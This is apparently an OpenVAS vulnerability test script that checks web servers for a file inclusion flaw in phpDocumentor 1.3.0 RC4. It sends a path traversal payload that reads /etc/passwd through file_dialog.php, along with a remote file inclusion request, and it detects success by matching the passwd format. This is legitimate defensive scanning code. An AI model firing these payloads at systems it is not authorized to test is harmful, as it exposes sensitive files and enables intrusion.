# OpenVAS Vulnerability Test
# $Id: phpdocumentor_1_3_remote_file_inclusion.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: phpDocumentor <= 1.3.0 RC4 Local And Remote File Inclusion Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP script that is prone to file
inclusion flaws. 

Description :

phpDocumentor is a automatic documentation generator for PHP. 

The remote host appears to be running the web-interface of
phpDocumentor. 

This version does not properly sanitize user input in the
'file_dialog.php' file and a test file called 'bug-559668.php' It is
possible for an attacker to include remote files and execute arbitrary
commands on the remote system, and display the content of sensitive
files. 

This flaw is exploitable if PHP's 'register_globals' setting is
enabled.";

tag_solution = "Disable PHP's 'register_globals' setting.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.20374");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2005-4593");
 script_bugtraq_id(16080);
 script_xref(name:"OSVDB", value:"22114");
 script_xref(name:"OSVDB", value:"22115");
 script_name("phpDocumentor <= 1.3.0 RC4 Local And Remote File Inclusion Vulnerability");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_active");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://retrogod.altervista.org/phpdocumentor_130rc4_incl_expl.html");
 script_xref(name : "URL" , value : "http://marc.theaimsgroup.com/?l=bugtraq&m=113587730223824&w=2");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/phpdocumentor", "/phpdoc", "/PhpDocumentor", cgi_dirs( port:port ) ) ) { 

 if( dir == "/" ) dir = "";

 # Check if we can find phpDocumentor installed. 
 res = http_get_cache(item:string(dir, "/docbuilder/top.php"), port:port);
 if (res == NULL) continue;

 if (egrep(pattern:"docBuilder.*phpDocumentor v[0-9.]+.*Web Interface", string:res))
 {
  # Try the local file inclusion flaw.
  exploit[0] = "../../../../../../../etc/passwd%00";
  result = "root:.*:0:[01]:.*:";
  error = "Warning.*main.*/etc/passwd.*failed to open stream";
 
   # Try to grab a remote file.
   exploit[1] = string("http://", get_host_name(), "/robots.txt%00");
   result = "root:.*:0:[01]:.*:|User-agent:";  
   error = "Warning.*main.*/etc/passwd.*failed to open stream|Warning.*/robots.txt.*failed to open stream"; 

  for(exp = 0; exploit[exp]; exp++) 
  {
   req = http_get(item:string(dir, "/docbuilder/file_dialog.php?root_dir=", exploit[exp]), port:port);
   
   recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if (recv == NULL) exit(0);
   
   if (egrep(pattern:result, string:recv) ||
       # Check if there is a error that the file can not be found.
       egrep(pattern:error, string:recv)) 
   {
    security_message(port);
    exit(0);
   } 
  }
 }
}
